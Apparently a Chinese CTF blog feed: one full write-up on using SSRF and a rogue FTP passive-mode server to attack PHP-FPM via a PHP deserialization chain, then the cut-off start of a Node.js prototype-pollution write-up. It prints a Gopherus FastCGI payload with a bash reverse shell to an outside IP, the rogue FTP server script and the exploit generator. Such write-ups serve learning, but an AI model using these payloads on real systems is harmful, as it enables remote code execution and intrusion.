        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>听别的师傅说ssrf打ftp已经是常考点了，所以今天结合陇原战“疫“的一道赛题学习一下ssrf利用ftp的被动模式攻击fpm的技巧。</p><h3 id="什么是php-fpm"><a href="#什么是php-fpm" class="headerlink" title="什么是php-fpm"></a>什么是php-fpm</h3><p>fpm从字面意思理解就是php-fastcgi进程管理器，用于动态管理进程，也可以说是cgi程序。那么fastcgi又是什么？</p><h3 id="什么是fastcgi"><a href="#什么是fastcgi" class="headerlink" title="什么是fastcgi"></a>什么是fastcgi</h3><p>前身是cgi，一个通用网关接口，当客户端发出的请求到http服务器，例如nginx或者apache，会通过匹配后缀知道该请求是一个动态的php请求，那么web服务器就会直接交给php-fpm进行处理，通过php语法分析处理该请求后的结果返回给web服务器，再返回给我们客户端。</p><p>这么说可能比较抽象，举一个例子，比如我们发送一个index.php?file&#x3D;&#x2F;etc&#x2F;passwd，web服务器接收到url请求后，它会匹配index.php中的php后缀，并判断它是动态的php请求，然后通过网关接口发送给fpm，而参数file&#x3D;&#x2F;etc&#x2F;passwd内容是由php解释器来执行。而cgi就是一个能够解析php语法的程序，fastcgi是一个通讯协议，是cgi的改进版。更详细参考这篇文章：CGI与FastCGI详解与区别_CL82的博客-CSDN博客_cgi和fastcgi的区别</p><h3 id="怎么打php-fpm"><a href="#怎么打php-fpm" class="headerlink" title="怎么打php-fpm?"></a>怎么打php-fpm?</h3><p>这篇文章的主题就是打php-fpm，那么该怎么打？php-fpm默认监听的就是9000端口。我们知道fastcgi是一种通讯协议，web服务器与fpm是通过fastcgi协议来通讯的，在fpm数据包中有一个字段SCRIPT_FILENAME，它指向要执行的文件，就例如&#x2F;etc&#x2F;passwd，后来，fpm的默认配置中增加了一个选项 security.limit_extensions限定了某些后缀的文件被执行，所以就有些局限，当然，如果我们能够对fpm任意命令执行是最好的。这里就有auto_prepend_file和auto_append_file这两个配置项。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_append_file  #在执行php文件后自动包含一个指定文件</span><br><span class="line">auto_prepend_file  #在执行php文件前自动包含一个指定文件</span><br></pre></td></tr></table></figure><p>我们主要就利用auto_prepend_file配置项，如果设置auto_prepend_file&#x3D;php:&#x2F;&#x2F;input，那么再执行指定文件的时候，它就会先包含body中的内容，如果我们把恶意命令添加到body中，就可以执行任意命令。前提是能够远程文件包含。总体理一下思路，客户端控制web服务器访问本地的fpm的9000端口，伪造配置包含php:&#x2F;&#x2F;input的数据，执行恶意代码。主要利用gopherus工具来实现攻击。</p><h3 id="ftp的被动模式"><a href="#ftp的被动模式" class="headerlink" title="ftp的被动模式"></a>ftp的被动模式</h3><p>ftp是文件传输协议，用来传输协议。一般情况下默认为主动模式，通过20端口来传输数据，通过21端口来传输控制信息，主动模式的工作原理：</p><pre><code>首先客户端连接ftp服务器的tcp21端口，向该端口发送控制信息（port命令）该port命令主要包含客户端用什么端口接收命令，接着ftp服务器接收命令，使用本机的20端口去连接客户端的指定端口，并发送数据。</code></pre><p>如果客户端的主机是内网主机，就算开放了指定端口，ftp服务器也连接不上客户端，因此也没办法传输数据，所以在此缺陷下有了被动模式。</p><p>被动模式的工作原理：</p><pre><code>同样是客户端连接ftp服务器的20端口建立连接，但并不是发送port命令，而是发送pasv命令。服务端收到pasv命令后，在自己本机上打开一个高端端口(&gt;1024)，并发送数据通知客户端向我的该高端端口发送数据，客户端收到后就与服务端该端口建立连接传输数据。</code></pre><h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>在ftp的被动模式下，服务端向客户端发送本机的公网ip与指定端口，让客户端去连接传输数据。那么如果我们去在自己的vps上构造一个恶意的ftp服务器，去修改ftp服务端向客户端发送的ip与端口为127.0.0.1的9000端口。让客户端去连接本机的9000端口传输数据，（此时的客户端是web服务器）如果在 9000端口上开启了fpm服务，我们上传伪造的fastcgi协议就会传输到web服务器的9000端口，与fpm进行交互，以此达到执行恶意命令的目的。</p><h2 id="题目实战"><a href="#题目实战" class="headerlink" title="题目实战"></a>题目实战</h2><h3 id="陇原战”疫”eaaasyphp"><a href="#陇原战”疫”eaaasyphp" class="headerlink" title="陇原战”疫”eaaasyphp"></a>陇原战”疫”eaaasyphp</h3><p>打开题目是一段php代码，</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Check</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$str1</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$str2</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Esle</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title class_">Check</span>::<span class="variable">$str1</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hint</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hint = <span class="string">&quot;no hint&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;hint)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;hint = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;hint)();</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bunny</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Check</span>::<span class="variable">$str2</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;data)&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;data = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;data);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title class_">Check</span>::<span class="variable">$str2</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Welcome&quot;</span> . <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bypass</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Check</span>::<span class="variable">$str1</span>) &#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;str4)();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一看就是反序列化的题，目标函数file_put_contents，可以写马进去。pop链也比较简单，链子为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Bypass::__destruct-&gt;Welcome::__invoke-&gt;Bunny::__tostring-&gt;file_put_contents</span><br></pre></td></tr></table></figure><p>尝试一番后发现文件没有被写入，可能是因为没有写入权限。我们构造序列化串查看一下php的版本信息，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:%22Hint%22:-1:&#123;&#125;</span><br></pre></td></tr></table></figure><p>这里有个小点，我们需要绕过wakeup让hint为空。这里不能用属性值大于原有值来绕过了，因为这个php版本有点高，将属性值改为负数就可以绕过了。</p><p>在phpinfo里找到了fastcgi。那么这题就要打fpm了。</p><img src="/2023/01/31/ssrf%E5%88%A9%E7%94%A8ftp%E8%A2%AB%E5%8A%A8%E6%A8%A1%E5%BC%8F%E6%89%93fpm/89.png" class><p>那么我们就要利用file_put_contents来上传攻击fastcgi的payload，然后再通过ftp的被动模式转发给fpm的9000端口达到攻击效果。首先我们使用Gopherus工具来生成伪造的fastcgi协议。</p><img src="/2023/01/31/ssrf%E5%88%A9%E7%94%A8ftp%E8%A2%AB%E5%8A%A8%E6%A8%A1%E5%BC%8F%E6%89%93fpm/90.png" class><p>复制_后面的内容，  </p><pre><code>%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH105%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00i%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/1.116.160.155/2334%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</code></pre><p>接着在自己的vps上起一个恶意的ftp服务器。py代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">2337</span>)) <span class="comment">#端口可改</span></span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(<span class="string">b&#x27;220 welcome\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Service ready for new user.</span></span><br><span class="line"><span class="comment">#Client send anonymous username</span></span><br><span class="line"><span class="comment">#USER anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;331 Please specify the password.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User name okay, need password.</span></span><br><span class="line"><span class="comment">#Client send anonymous password.</span></span><br><span class="line"><span class="comment">#PASS anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;230 Login successful.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User logged in, proceed. Logged out if appropriate.</span></span><br><span class="line"><span class="comment">#TYPE I</span></span><br><span class="line">conn.send(<span class="string">b&#x27;200 Switching to Binary mode.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Size /</span></span><br><span class="line">conn.send(<span class="string">b&#x27;550 Could not get the file size.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#EPSV (1)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 ok\n&#x27;</span>)</span><br><span class="line"><span class="comment">#PASV</span></span><br><span class="line">conn.send(<span class="string">b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n&#x27;</span>) <span class="comment">#STOR / (2)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 Permission denied.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#QUIT</span></span><br><span class="line">conn.send(<span class="string">b&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><p>贴上ftp状态码：<a href="https://www.cnblogs.com/dongiosblogs/p/4548770.html">FTP状态码 - 冻冻儿 - 博客园</a></p><p>使用命令python3 ftp.py启动ftp服务器，另外开启一个vps监听2334端口。</p><p>让data赋值恶意payload，username&#x3D;<a href="ftp://aaa@vps:2337/123%E3%80%82%E6%9C%80%E7%BB%88pop%E9%93%BE%E4%B8%BA%EF%BC%9A">ftp://aaa@vps:2337/123。最终pop链为：</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Check</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$str1</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$str2</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Esle</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title class_">Check</span>::<span class="variable">$str1</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bunny</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Check</span>::<span class="variable">$str2</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;data)&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;data = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;data);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title class_">Check</span>::<span class="variable">$str2</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Welcome&quot;</span> . <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bypass</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;aaa = <span class="keyword">new</span> <span class="title class_">Esle</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Bypass</span>();</span><br><span class="line"><span class="variable">$b</span> =<span class="keyword">new</span> <span class="title class_">Welcome</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Bunny</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;str4 = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;username = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;filename=<span class="string">&quot;ftp://aaa@1.116.160.155:2337/123&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;data=<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH105%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00i%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/1.116.160.155/2334%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>打入payload成功反弹shell。后面就查询到flag了。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>这种技巧的前提是要有文件上传点，就例如本题中的file_put_contents函数，还有打fpm需要考虑靶机是否监听了9000端口，或者说9000上是否启动了fpm服务。考虑这些前提之后结合ssrf漏洞就能达到远程rce的效果了。</p><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://blog.csdn.net/qq_51295677/article/details/124506546">陇原战“疫“2021网络安全大赛的一道web_errorr0的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/L2329794714/article/details/122196805">SSRF 攻击PHP-FPM（FastCGI 攻击）：学习总结仅供参考_头秃的bug的博客-CSDN博客_fastcgi ssrf</a></p>]]></content>
      
      
      <categories>
          
          <category> 基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF X CBCTF cbshop</title>
      <link href="/2023/01/31/DASCTF-X-CBCTF-cbshop/"/>
      <url>/2023/01/31/DASCTF-X-CBCTF-cbshop/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个是前几天buu的九月赛的一道web题，赛后根据官方出的wp也是复现了一下，当时打的时候没有看附件，以为就是一个逻辑漏洞，之后才知道是node.js的代码审计和原型链污染，原型链污染我也了解过，只不过一直没有练习对应的题目，所以说这一题对我来说也是有必要记录一下的。</p><h2 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h2><p>打开题目是一个购买商店，登录普通用户有十点钱数。</p><img src="/2023/01/31/DASCTF-X-CBCTF-cbshop/78.png" class><p>但是flag要十一点，很明显买不起的。以为跟逻辑漏洞有关，其实给了附件，附件中有源码，审计js代码。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParse = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = process.<span class="property">env</span>.<span class="property">PORT</span> || <span class="number">80</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET</span> = process.<span class="property">env</span>.<span class="property">SECRET</span> || <span class="string">&quot;cybershop_challenge_secret&quot;</span></span><br><span class="line"><span class="keyword">const</span> adminUser = &#123;</span><br><span class="line">    <span class="attr">username</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="attr">password</span>: <span class="string">&quot;😀admin😀&quot;</span>,</span><br><span class="line">    <span class="attr">money</span>: <span class="number">9999</span></span><br><span class="line">&#125;;</span><br><span class="line">app.<span class="title function_">use</span>(bodyParse.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">false</span>&#125;));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">secret</span>: <span class="variable constant_">SECRET</span>,  </span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">false</span>,  </span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>, </span><br><span class="line">    <span class="attr">cookie</span>: &#123; <span class="attr">maxAge</span>: <span class="number">3600</span> * <span class="number">1000</span> &#125;</span><br><span class="line">&#125;));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&quot;static&quot;</span>));</span><br><span class="line"> </span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/isLogin&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">username</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;</span><br><span class="line">            <span class="attr">code</span>: <span class="number">2</span>,</span><br><span class="line">            <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">username</span>,</span><br><span class="line">            <span class="attr">money</span>: req.<span class="property">session</span>.<span class="property">money</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">code</span>: <span class="number">0</span>, <span class="attr">msg</span>: <span class="string">&#x27;Please login!&#x27;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line">    <span class="keyword">let</span> password = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> username !== <span class="string">&#x27;string&#x27;</span> || username === <span class="string">&#x27;&#x27;</span> || <span class="keyword">typeof</span> password !== <span class="string">&#x27;string&#x27;</span> || password === <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">code</span>: <span class="number">4</span>, <span class="attr">msg</span>: <span class="string">&#x27;illegal username or password!&#x27;</span>&#125;)</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(username === adminUser.<span class="property">username</span> &amp;&amp; password === adminUser.<span class="property">password</span>.<span class="title function_">substring</span>(<span class="number">1</span>,<span class="number">6</span>)) &#123;<span class="comment">//only admin need password</span></span><br><span class="line">        req.<span class="property">session</span>.<span class="property">username</span> = username;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">money</span> = adminUser.<span class="property">money</span>;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;</span><br><span class="line">            <span class="attr">code</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">username</span>: username,</span><br><span class="line">            <span class="attr">money</span>: req.<span class="property">session</span>.<span class="property">money</span>,</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&#x27;admin login success!&#x27;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">username</span> = username;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">money</span> = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;</span><br><span class="line">        <span class="attr">code</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="attr">username</span>: username,</span><br><span class="line">        <span class="attr">money</span>: req.<span class="property">session</span>.<span class="property">money</span>,</span><br><span class="line">        <span class="attr">msg</span>: <span class="string">`<span class="subst">$&#123;username&#125;</span> login success!`</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/changeUsername&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">username</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;</span><br><span class="line">            <span class="attr">code</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&#x27;please login!&#x27;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> username !== <span class="string">&#x27;string&#x27;</span> || username === <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">code</span>: <span class="number">4</span>, <span class="attr">msg</span>: <span class="string">&#x27;illegal username!&#x27;</span>&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">username</span> = username;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;</span><br><span class="line">        <span class="attr">code</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="attr">username</span>: username,</span><br><span class="line">        <span class="attr">money</span>: req.<span class="property">session</span>.<span class="property">money</span>,</span><br><span class="line">        <span class="attr">msg</span>: <span class="string">&#x27;Username change success&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//购买商品的接口</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">buyApi</span>(<span class="params">user, product</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> order = &#123;&#125;;</span><br><span class="line">    <span class="keyword">if</span>(!order[user.<span class="property">username</span>]) &#123;</span><br><span class="line">        order[user.<span class="property">username</span>] = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">assign</span>(order[user.<span class="property">username</span>], product);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(product.<span class="property">id</span> === <span class="number">1</span>) &#123;             <span class="comment">//buy fakeFlag</span></span><br><span class="line">        <span class="keyword">if</span>(user.<span class="property">money</span> &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">            user.<span class="property">money</span> -= <span class="number">10</span>;</span><br><span class="line">            <span class="title class_">Object</span>.<span class="title function_">assign</span>(order, &#123; <span class="attr">msg</span>:  fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;/fakeFlag&#x27;</span>).<span class="title function_">toString</span>() &#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title class_">Object</span>.<span class="title function_">assign</span>(order,&#123; <span class="attr">msg</span>: <span class="string">&quot;you don&#x27;t have enough money!&quot;</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(product.<span class="property">id</span> === <span class="number">2</span>) &#123;        <span class="comment">//buy flag</span></span><br><span class="line">        <span class="keyword">if</span>(user.<span class="property">money</span> &gt;= <span class="number">11</span> &amp;&amp; user.<span class="property">token</span>) &#123;  <span class="comment">//do u have token?</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(product).<span class="title function_">includes</span>(<span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">                <span class="title class_">Object</span>.<span class="title function_">assign</span>(order,&#123; <span class="attr">msg</span>: <span class="string">&quot;hint: go to &#x27;readFileSync&#x27;!!!!&quot;</span> &#125;);</span><br><span 